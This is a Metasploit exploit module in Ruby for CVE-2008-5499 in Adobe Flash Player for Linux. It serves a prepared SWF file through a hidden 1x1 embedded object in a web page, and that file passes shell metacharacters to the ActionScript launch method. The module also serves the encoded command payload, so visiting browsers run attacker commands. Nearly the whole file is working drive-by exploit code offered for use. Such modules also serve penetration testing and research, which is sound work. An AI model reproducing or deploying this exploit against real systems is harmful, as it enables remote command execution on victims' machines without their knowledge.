##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Adobe Flash Player ActionScript Launch Command Execution Vulnerability',
			'Description'    => %q{
					This module exploits a vulnerability in Adobe Flash Player for Linux,
					version  10.0.12.36 and 9.0.151.0 and prior.
					An input validation vulnerability allows command execution when the browser
					loads a SWF file which contains shell metacharacters in the arguments to
					the ActionScript launch method.

					The victim must have Adobe AIR installed for the exploit to work. This module
					was tested against version 10.0.12.36 (10r12_36).
				},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'0a29406d9794e4f9b30b3c5d6702c708', # Metasploit version
				],
			'References'     =>
				[
					['CVE', '2008-5499'],
					['OSVDB', '50796'],
					['URL', 'http://www.adobe.com/support/security/bulletins/apsb08-24.html'],
					['URL', 'http://www.securityfocus.com/bid/32896/exploit']
				],
			'DefaultOptions' =>
				{
					'HTTP::compression' => 'gzip',
					'HTTP::chunked'     => true
				},
			'Platform'       => 'unix', # so unix cmd exec payloads are ok
			'Arch'           => ARCH_CMD,
			'Targets'        =>
				[
					[ 'Automatic', {}],
				],
			'DisclosureDate' => 'Dec 17 2008',
			'DefaultTarget'  => 0))

	end

	def exploit
		path = File.join( Msf::Config.install_root, "data", "exploits", "CVE-2008-5499.swf" )
		fd = File.open( path, "rb" )
		@swf = fd.read(fd.stat.size)
		fd.close

		super
	end

	def on_request_uri(cli, request)
		msg = "#{cli.peerhost.ljust(16)} #{self.shortname}"
		trigger = @swf
		trigger_file = rand_text_alpha(rand(6)+3) + ".swf"

		obj_id = rand_text_alpha(rand(6)+3)

		if request.uri.match(/\.swf/i)
			print_status("#{msg} Sending Exploit SWF")
			send_response(cli, trigger, { 'Content-Type' => 'application/x-shockwave-flash' })
			return
		end

		if request.uri.match(/\.txt/i)
			send_response(cli, payload.encoded, { 'Content-Type' => 'text/plain' })
			return
		end

		html =  <<-EOS
		<html>
			<head>
			</head>
			<body>
			<center>
			<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" id="#{obj_id}" width="1" height="1" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab">
				<param name="movie" value="#{get_resource}#{trigger_file}" />
				<embed src="#{get_resource}#{trigger_file}" quality="high" width="1" height="1" name="#{obj_id}" align="middle" allowNetworking="all"
					type="application/x-shockwave-flash"
					pluginspage="http://www.macromedia.com/go/getflashplayer">
				</embed>

			</object>
		</center>

		</body>
		</html>
		EOS

		print_status("#{msg} Sending HTML...")
		send_response(cli, html, { 'Content-Type' => 'text/html' })
	end
end
